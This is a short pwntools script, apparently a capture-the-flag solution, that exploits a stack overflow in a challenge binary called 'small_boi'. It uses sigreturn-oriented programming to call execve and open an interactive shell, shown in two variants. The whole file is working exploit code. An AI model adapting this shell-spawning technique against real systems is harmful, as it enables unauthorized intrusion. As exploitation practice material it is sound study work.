# encoding: utf-8
# reference: https://www.slideshare.net/AngelBoy1/sigreturn-ori

from pwn import *

elf = ELF('./small_boi')

sh = 0x4001ca
syscall = 0x400185
bss = 0x601000
sigreturn = 0x400180

r = process('./small_boi')

# 方法一
payload  = 'a'*0x28 + p64(sigreturn) + '\x00'*0x68 + p64(sh) + '\x00'*8 + p64(0) + '\x00'*0x10 + p64(59) + '\x00'*8 + p64(bss) + p64(syscall)
payload += p64(0) + p64(0x33)
r.sendline(payload)
r.interactive()


# 方法二 (都一樣, 只是寫法不同)
context.arch = 'amd64'
paylaod  = "A"*0x28 + p64(sigreturn)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss
frame.rip = syscall
paylaod += str(frame)
#r.sendline(paylaod)
#r.interactive()